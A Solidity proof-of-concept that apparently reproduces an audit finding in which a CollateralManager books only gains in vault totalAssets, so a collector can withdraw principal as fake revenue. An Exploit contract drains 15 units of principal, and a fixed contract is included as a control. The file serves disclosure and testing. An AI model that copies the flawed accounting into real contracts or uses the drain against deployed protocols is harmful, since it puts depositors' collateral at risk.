// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Tenbin finding 64974:
// "Revenue accounting ignores losses" (Spearbit, CollateralManager).
//
// CollateralManager tracks "revenue" as the running sum of POSITIVE jumps in the
// underlying vault's totalAssets, and never offsets it when the vault loses
// value. _computeNewRevenue returns 0 on a loss, and _realizeRevenue only ever
// ADDS to pendingRevenue — it never subtracts a loss. So after the vault gains
// then loses, pendingRevenue overstates the net yield. withdrawRevenue pays out
// the stale figure, transferring principal collateral out of the manager as
// fake "revenue", under-collateralizing the protocol.
//
// The three vulnerable functions (_computeNewRevenue, _realizeRevenue,
// withdrawRevenue) and the pendingRevenue / lastTotalAssets state are inlined
// VERBATIM from the finding. The only doubles are (1) a minimal ERC20 for the
// opaque collateral token, and (2) a minimal ERC4626 vault exposing a
// controllable totalAssets() — faithful, since the bug is purely in the
// manager's own accounting, not in the vault or token.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC4626 {
    function totalAssets() external view returns (uint256);
}

/// @dev Minimal faithful double for OpenZeppelin's SafeERC20.safeTransfer, so the
///      verbatim `IERC20(collateral).safeTransfer(...)` line compiles unchanged.
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "SafeERC20: transfer failed");
    }
}

/// @dev Minimal ERC20 double. Used for the opaque collateral token (the manager
///      is pre-funded with principal) and for the harm MARKER token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful ERC4626 double exposing a controllable totalAssets().
///      The manager only ever reads totalAssets() for its revenue accounting, so
///      a plain setter is a faithful stand-in for underlying gains/losses.
contract MiniVault {
    uint256 internal _totalAssets;

    function setTotalAssets(uint256 v) external {
        _totalAssets = v;
    }

    function totalAssets() external view returns (uint256) {
        return _totalAssets;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. _computeNewRevenue, _realizeRevenue and withdrawRevenue,
// plus the pendingRevenue / lastTotalAssets state, are VERBATIM from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract CollateralManager {
    using SafeERC20 for IERC20;

    bytes32 public constant COLLECTOR_ROLE = keccak256("COLLECTOR_ROLE");
    mapping(bytes32 => mapping(address => bool)) public hasRole;

    bool public paused;
    uint256 private _reentrancyStatus = 1;

    mapping(address => IERC4626) public vaults;

    // --- Revenue-related state (verbatim) ---
    mapping(address => uint256) public pendingRevenue;
    mapping(address => uint256) public lastTotalAssets;

    error CollateralNotSupported();
    error ExceedsPendingRevenue();
    error NotAuthorized();
    error IsPaused();
    error Reentrancy();

    event RevenueWithdraw(address indexed collateral, uint256 amount);

    modifier onlyRole(bytes32 role) {
        if (!hasRole[role][msg.sender]) revert NotAuthorized();
        _;
    }

    modifier notPaused() {
        if (paused) revert IsPaused();
        _;
    }

    modifier nonReentrant() {
        if (_reentrancyStatus != 1) revert Reentrancy();
        _reentrancyStatus = 2;
        _;
        _reentrancyStatus = 1;
    }

    constructor() {
        // Deployer is granted the collector role (the semi-trusted revenue collector).
        hasRole[COLLECTOR_ROLE][msg.sender] = true;
    }

    /// @notice Register a collateral/vault pair and seed the high-water mark to
    ///         the vault's current totalAssets — exactly as the real manager does
    ///         when a collateral is first supported.
    function registerCollateral(address collateral, IERC4626 vault) external {
        vaults[collateral] = vault;
        lastTotalAssets[collateral] = vault.totalAssets();
    }

    // --- Verbatim vulnerable revenue calculation ---
    function _computeNewRevenue(address collateral, IERC4626 vault) internal view returns (uint256 revenue) {
        uint256 totalAssets = vault.totalAssets();
        uint256 lastTotal = lastTotalAssets[collateral];
        if (totalAssets > lastTotal) {
            unchecked {
                revenue = totalAssets - lastTotal;
            }
        }
    }

    function _realizeRevenue(address collateral, IERC4626 vault) internal {
        uint256 newRevenue = _computeNewRevenue(collateral, vault);
        if (newRevenue > 0) pendingRevenue[collateral] += newRevenue; // @> only positive deltas booked; a totalAssets loss is never subtracted from pendingRevenue
    }

    // --- Verbatim vulnerable revenue withdrawal ---
    function withdrawRevenue(address collateral, uint256 amount) external nonReentrant notPaused onlyRole(COLLECTOR_ROLE) {
        IERC4626 vault = vaults[collateral];
        if (address(vault) == address(0)) revert CollateralNotSupported();

        _realizeRevenue(collateral, vault);
        uint256 totalRevenue = pendingRevenue[collateral];

        if (amount > totalRevenue) revert ExceedsPendingRevenue();

        IERC20(collateral).safeTransfer(msg.sender, amount);
        unchecked {
            pendingRevenue[collateral] = totalRevenue - amount;
        }

        lastTotalAssets[collateral] = vault.totalAssets();
        emit RevenueWithdraw(collateral, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): _realizeRevenue is the recommended
// loss-adjusting version from the finding — it subtracts losses from
// pendingRevenue before principal is touched. Everything else is identical.
// ─────────────────────────────────────────────────────────────────────────────
contract CollateralManagerFixed {
    using SafeERC20 for IERC20;

    bytes32 public constant COLLECTOR_ROLE = keccak256("COLLECTOR_ROLE");
    mapping(bytes32 => mapping(address => bool)) public hasRole;

    bool public paused;
    uint256 private _reentrancyStatus = 1;

    mapping(address => IERC4626) public vaults;

    mapping(address => uint256) public pendingRevenue;
    mapping(address => uint256) public lastTotalAssets;

    error CollateralNotSupported();
    error ExceedsPendingRevenue();
    error NotAuthorized();
    error IsPaused();
    error Reentrancy();

    event RevenueWithdraw(address indexed collateral, uint256 amount);

    modifier onlyRole(bytes32 role) {
        if (!hasRole[role][msg.sender]) revert NotAuthorized();
        _;
    }

    modifier notPaused() {
        if (paused) revert IsPaused();
        _;
    }

    modifier nonReentrant() {
        if (_reentrancyStatus != 1) revert Reentrancy();
        _reentrancyStatus = 2;
        _;
        _reentrancyStatus = 1;
    }

    constructor() {
        hasRole[COLLECTOR_ROLE][msg.sender] = true;
    }

    function registerCollateral(address collateral, IERC4626 vault) external {
        vaults[collateral] = vault;
        lastTotalAssets[collateral] = vault.totalAssets();
    }

    // --- Recommended loss-adjusting revenue accounting (from the finding) ---
    function _realizeRevenue(address collateral, IERC4626 vault) internal {
        uint256 totalAssets = vault.totalAssets();
        uint256 lastTotal = lastTotalAssets[collateral];
        if (totalAssets > lastTotal) {
            uint256 gain = totalAssets - lastTotal;
            pendingRevenue[collateral] += gain;
        } else if (totalAssets < lastTotal) {
            uint256 loss = lastTotal - totalAssets;
            uint256 rev = pendingRevenue[collateral];
            pendingRevenue[collateral] = loss >= rev ? 0 : rev - loss;
        }
        lastTotalAssets[collateral] = totalAssets;
    }

    function withdrawRevenue(address collateral, uint256 amount) external nonReentrant notPaused onlyRole(COLLECTOR_ROLE) {
        IERC4626 vault = vaults[collateral];
        if (address(vault) == address(0)) revert CollateralNotSupported();

        _realizeRevenue(collateral, vault);
        uint256 totalRevenue = pendingRevenue[collateral];

        if (amount > totalRevenue) revert ExceedsPendingRevenue();

        IERC20(collateral).safeTransfer(msg.sender, amount);
        unchecked {
            pendingRevenue[collateral] = totalRevenue - amount;
        }

        lastTotalAssets[collateral] = vault.totalAssets();
        emit RevenueWithdraw(collateral, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Reproduces the finding's exact numeric scenario:
//   lastTotalAssets = 100; vault gains to 120 (books +20, high-water = 120);
//   vault loses 15 to 105 (ignored); collector withdraws 20 as "revenue" while
//   true net yield is only 5 -> 15 of manager principal is drained.
// The 15-unit principal drain is recorded on a MARKER token minted to the SINK.
// The same scenario is replayed against the FIXED manager, whose loss-adjusting
// accounting reduces pendingRevenue to 5 and reverts the 20-unit withdrawal.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant INIT_TOTAL = 100 ether; // starting high-water mark
    uint256 internal constant GAIN_TOTAL = 120 ether; // vault appreciates (+20)
    uint256 internal constant LOSS_TOTAL = 105 ether; // vault loses 15 (net yield +5)
    uint256 internal constant WITHDRAW_AMT = 20 ether; // stale pendingRevenue paid out
    uint256 internal constant TRUE_YIELD = 5 ether; // honest net yield = 105 - 100
    uint256 internal constant PRINCIPAL_DRAINED = 15 ether; // 20 paid - 5 real yield
    uint256 internal constant MANAGER_PREFUND = 1000 ether; // principal collateral held by manager

    // Exposed results for the driver to assert on.
    address public managerAddr;
    address public fixedManagerAddr;
    address public markerAddr;
    address public collateralAddr;

    uint256 public managerBalBefore;
    uint256 public managerBalAfter;
    uint256 public collectorReceived;
    uint256 public principalDrained;
    uint256 public sinkMarkerBalance;
    bool public fixedReverted;

    function run() external payable {
        // --- deploy doubles + both managers (marker LAST) ---
        MiniToken collateral = new MiniToken("Collateral", "COL"); // nonce 1
        MiniVault vault = new MiniVault(); // nonce 2
        CollateralManager manager = new CollateralManager(); // nonce 3
        CollateralManagerFixed managerFixed = new CollateralManagerFixed(); // nonce 4
        MiniToken marker = new MiniToken("Lost Collateral", "LOST-collateral"); // nonce 5 (LAST)

        managerAddr = address(manager);
        fixedManagerAddr = address(managerFixed);
        markerAddr = address(marker);
        collateralAddr = address(collateral);

        // ================= BUGGY PATH (real harm) =================
        // Step 1: register collateral at totalAssets = 100 -> lastTotalAssets = 100.
        vault.setTotalAssets(INIT_TOTAL);
        manager.registerCollateral(address(collateral), IERC4626(address(vault)));

        // Fund the manager with principal collateral it must never pay out as revenue.
        collateral.mint(address(manager), MANAGER_PREFUND);
        managerBalBefore = collateral.balanceOf(address(manager)); // 1000

        // Step 2: vault appreciates to 120. A management action (withdrawRevenue(0))
        // realizes +20 into pendingRevenue and bumps the high-water mark to 120.
        vault.setTotalAssets(GAIN_TOTAL);
        manager.withdrawRevenue(address(collateral), 0); // pendingRevenue = 20, lastTotalAssets = 120

        // Step 3: vault loses 15, dropping to 105. The loss is IGNORED
        // (_computeNewRevenue returns 0), so pendingRevenue stays 20 though net
        // yield is only 5. The collector withdraws the full stale 20.
        vault.setTotalAssets(LOSS_TOTAL);
        manager.withdrawRevenue(address(collateral), WITHDRAW_AMT); // drains 20 to this (collector)

        managerBalAfter = collateral.balanceOf(address(manager)); // 980
        collectorReceived = collateral.balanceOf(address(this)); // 20

        // Honest accounting would have allowed only TRUE_YIELD (5) out; the excess
        // is principal drained as fake revenue.
        principalDrained = collectorReceived - TRUE_YIELD; // 15

        // Record the principal-drain magnitude on the MARKER token at the SINK.
        marker.mint(SINK, principalDrained);
        sinkMarkerBalance = marker.balanceOf(SINK); // 15

        // ================= FIXED PATH (negative control) =================
        // Same scenario against the loss-adjusting manager: pendingRevenue is
        // reduced to 5 on the loss, so the 20-unit withdrawal reverts.
        vault.setTotalAssets(INIT_TOTAL);
        managerFixed.registerCollateral(address(collateral), IERC4626(address(vault)));
        collateral.mint(address(managerFixed), MANAGER_PREFUND);

        vault.setTotalAssets(GAIN_TOTAL);
        managerFixed.withdrawRevenue(address(collateral), 0); // pendingRevenue = 20

        vault.setTotalAssets(LOSS_TOTAL);
        try managerFixed.withdrawRevenue(address(collateral), WITHDRAW_AMT) {
            fixedReverted = false; // over-withdrawal succeeded -> control FAILED
        } catch {
            fixedReverted = true; // loss-adjusted to 5 -> 20 exceeds pendingRevenue -> revert
        }

        // --- harm holds ---
        require(collectorReceived == WITHDRAW_AMT, "buggy path did not pay out the full stale 20");
        require(managerBalBefore - managerBalAfter == WITHDRAW_AMT, "manager not drained by 20");
        require(principalDrained == PRINCIPAL_DRAINED, "principal-drain magnitude mismatch");
        require(sinkMarkerBalance == PRINCIPAL_DRAINED, "marker did not record 15 at SINK");
        require(fixedReverted, "fixed loss-adjusting control failed to block the over-withdrawal");
    }
}
